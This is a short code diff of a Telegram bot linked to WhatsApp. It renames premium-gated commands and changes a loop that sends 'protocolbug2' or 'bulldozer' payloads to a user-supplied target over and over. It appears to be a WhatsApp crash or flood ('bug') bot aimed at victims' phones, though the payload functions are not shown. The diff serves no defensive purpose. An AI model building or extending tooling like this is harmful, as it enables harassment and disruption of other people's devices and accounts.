@@ -1352,7 +1352,7 @@ bot.command("system", checkWhatsAppConnection, checkPremium, async ctx => {
   await donerespone(target, ctx);
 });
 
-bot.command("bull", checkWhatsAppConnection, checkPremium, async ctx => {
+bot.command("bull1", checkWhatsAppConnection, checkPremium, async ctx => {
   const q = ctx.message.text.split(" ")[1];
 
   if (!q) {
@@ -1372,7 +1372,7 @@ bot.command("bull", checkWhatsAppConnection, checkPremium, async ctx => {
   await donerespone(target, ctx);
 });
 
-bot.command("fx", checkWhatsAppConnection, checkPremium, async ctx => {
+bot.command("ranzbull", checkWhatsAppConnection, checkPremium, async ctx => {
   const q = ctx.message.text.split(" ")[1];
 
   if (!q) {
@@ -1383,9 +1383,9 @@ bot.command("fx", checkWhatsAppConnection, checkPremium, async ctx => {
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 500; i++) {
-        await protocolbug2(target, true);
-        await sleep(1000)
+  for (let i = 0; i < 100; i++) {
+        await bulldozer(target)
+        await sleep(3000)
     
 }
 
